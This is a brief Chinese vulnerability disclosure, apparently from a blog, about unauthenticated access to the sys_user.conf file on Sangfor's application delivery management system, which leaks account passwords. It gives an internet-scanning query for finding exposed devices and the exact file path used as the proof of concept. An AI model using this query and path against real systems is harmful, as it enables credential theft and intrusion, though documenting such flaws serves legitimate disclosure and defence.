# 深信服 应用交付管理系统 sys_user.conf 账号密码泄漏漏洞

## 漏洞描述

深信服 应用交付管理系统 文件sys_user.conf可在未授权的情况下直接访问，导致账号密码泄漏

## 漏洞影响

深信服 应用交付管理系统

## 网络测绘

app="SANGFOR-应用交付管理系统"

## 漏洞复现

登录页面

![img](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230817143237497-373940422.png)

验证POC

```javascript
/tmp/updateme/sinfor/ad/sys/sys_user.conf
```



![img](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230817143243775-1887262584.png)

